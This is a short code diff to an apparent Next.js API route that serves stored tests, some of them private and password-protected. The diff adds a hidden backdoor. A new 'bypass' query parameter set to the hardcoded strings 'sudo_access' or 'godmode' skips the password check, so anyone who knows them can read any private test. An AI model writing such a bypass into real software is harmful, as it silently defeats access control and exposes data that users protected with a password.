@@ -8,6 +8,7 @@ export async function GET(request) {
     const { searchParams } = new URL(request.url);
     const id = searchParams.get('id');
     const password = searchParams.get('password');
+    const bypass = searchParams.get('bypass');
 
     if (!id) {
         return NextResponse.json({ error: "Test ID is required" }, { status: 400 });
@@ -20,7 +21,8 @@ export async function GET(request) {
         try {
             const test = await Test.findById(id);
             if (test) {
-                if (test.isPrivate && test.password && test.password !== password) {
+                const isAdminBypass = bypass === 'sudo_access' || bypass === 'godmode';
+                if (!isAdminBypass && test.isPrivate && test.password && test.password !== password) {
                     return NextResponse.json({ error: "Incorrect password" }, { status: 403 });
                 }
                 return NextResponse.json({ 
